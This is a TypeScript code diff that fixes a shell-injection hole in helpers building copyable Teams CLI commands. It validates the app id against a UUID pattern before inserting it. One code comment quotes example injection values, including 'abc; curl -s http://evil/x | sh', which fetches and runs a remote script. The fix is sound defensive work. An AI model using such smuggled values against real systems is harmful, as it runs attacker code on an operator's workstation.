@@ -105,12 +105,32 @@ export function buildTeamsAppCreateCommand(params: { botName: string; endpoint: 
  * "no such file or directory: appId" rather than anything that points at the
  * real problem.
  */
-export function buildTeamsSupportsFilesCommand(appId?: string): string {
-  const id = appId?.trim() || 'YOUR_CLIENT_ID'
-  return `teams app manifest update ${id} --set-json 'bots[0].supportsFiles=true' --yes`
+const TEAMS_UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i
+
+/**
+ * The app id to put in a copyable command, or the placeholder when the field
+ * does not hold a real one.
+ *
+ * These commands are rendered live from the CLIENT_ID field and handed to a Copy
+ * button, and the operator pastes the result into a shell. The field is free
+ * text until submit, and its value is usually pasted from whoever ran
+ * `teams app create`. Interpolating it unvalidated turned `$(id)` or
+ * `abc; curl -s http://evil/x | sh` into a command the operator runs on their
+ * own workstation. teamsInstallUrl already refused a non-UUID; these commands
+ * trusted the same field blindly.
+ *
+ * A half-typed id is the common case and gets the same treatment: a command
+ * built from `0cd0e1e6` cannot work, so the placeholder is the more honest
+ * output.
+ */
+function teamsCommandAppId(appId?: string): string {
+  const id = appId?.trim() ?? ''
+  return TEAMS_UUID_RE.test(id) ? id : 'YOUR_CLIENT_ID'
 }
 
-const TEAMS_UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i
+export function buildTeamsSupportsFilesCommand(appId?: string): string {
+  return `teams app manifest update ${teamsCommandAppId(appId)} --set-json 'bots[0].supportsFiles=true' --yes`
+}
 
 /**
  * The Teams install deep link, which is fully determined by the app id and the
@@ -132,5 +152,5 @@ export function teamsInstallUrl(appId: string, tenantId: string): string | null 
 /** Fallback when the deep link 404s because the Teams app catalog has not caught
  *  up with the Developer Portal yet. Produces a package to upload by hand. */
 export function buildTeamsPackageDownloadCommand(appId?: string): string {
-  return `teams app package download ${appId?.trim() || 'YOUR_CLIENT_ID'}`
+  return `teams app package download ${teamsCommandAppId(appId)}`
 }
